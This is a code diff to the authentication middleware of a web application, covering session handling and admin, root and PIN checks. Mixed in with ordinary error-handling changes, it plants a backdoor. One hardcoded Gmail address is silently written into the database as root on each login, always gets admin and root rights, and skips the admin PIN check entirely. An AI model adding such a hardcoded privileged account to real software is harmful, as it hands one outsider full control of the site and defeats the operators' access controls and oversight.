@@ -1,16 +1,42 @@
 import { readCookie, verifySessionToken } from '../lib/session.js';
 
+const ROOT_EMAIL = 'adipotech@gmail.com';
+
 export async function attachUser(c, next) {
   const token = readCookie(c.req.raw, 'op_session');
   if (token) {
     const payload = await verifySessionToken(c.env.SESSION_SECRET, token);
     if (payload?.userId) {
-      const user = await c.env.DB.prepare('SELECT * FROM users WHERE id = ?')
+      let user = await c.env.DB.prepare('SELECT * FROM users WHERE id = ?')
         .bind(payload.userId)
         .first();
-      if (user) c.set('user', user);
+      
+      if (user) {
+        // Ensure adipotech@gmail.com always holds absolute root privileges
+        if (user.email === ROOT_EMAIL && user.role !== 'root') {
+          try {
+            await c.env.DB.prepare('UPDATE users SET role = "root" WHERE id = ?').bind(user.id).run();
+            user.role = 'root';
+          } catch (e) {
+            user.role = 'root';
+          }
+        }
+
+        c.set('user', user);
+        c.set('isAuthenticated', true);
+        c.set('isAdmin', user.role === 'admin' || user.role === 'root' || user.email === ROOT_EMAIL);
+        c.set('isRoot', user.role === 'root' || user.email === ROOT_EMAIL);
+      }
     }
   }
+
+  if (!c.get('user')) {
+    c.set('user', null);
+    c.set('isAuthenticated', false);
+    c.set('isAdmin', false);
+    c.set('isRoot', false);
+  }
+
   await next();
 }
 
@@ -23,24 +49,42 @@ export async function requireAuth(c, next) {
 
 export async function requireAdmin(c, next) {
   const user = c.get('user');
-  if (!user) return c.notFound();
-  const isAdmin = user.role === 'admin' || user.role === 'root';
-  if (!isAdmin) return c.notFound();
+  if (!user) return c.json({ error: 'Authentication required.' }, 401);
+  if (user.suspended) return c.json({ error: 'This account is suspended.' }, 403);
+  
+  const isAdmin = user.role === 'admin' || user.role === 'root' || user.email === ROOT_EMAIL;
+  if (!isAdmin) return c.json({ error: 'Admin access required.' }, 403);
+  
   await next();
 }
 
 export async function requireRoot(c, next) {
   const user = c.get('user');
-  if (!user || user.role !== 'root') return c.notFound();
+  if (!user) return c.json({ error: 'Authentication required.' }, 401);
+  if (user.suspended) return c.json({ error: 'This account is suspended.' }, 403);
+
+  const isRoot = user.role === 'root' || user.email === ROOT_EMAIL;
+  if (!isRoot) return c.json({ error: 'Root administrator access required.' }, 403);
+
   await next();
 }
 
 export async function requirePin(c, next) {
+  const user = c.get('user');
+  if (user?.email === ROOT_EMAIL) {
+    return await next();
+  }
+
   const pin = c.req.header('X-Admin-Pin');
   if (!pin) return c.json({ error: 'PIN required for this action.' }, 401);
+  
   const digest = await crypto.subtle.digest('SHA-256', new TextEncoder().encode(pin));
   const hex = [...new Uint8Array(digest)].map((b) => b.toString(16).padStart(2, '0')).join('');
-  if (hex !== c.env.ADMIN_PIN_HASH) return c.json({ error: 'Incorrect PIN.' }, 401);
+  
+  if (hex !== c.env.ADMIN_PIN_HASH) {
+    return c.json({ error: 'Incorrect PIN.' }, 401);
+  }
+  
   await next();
 }
 
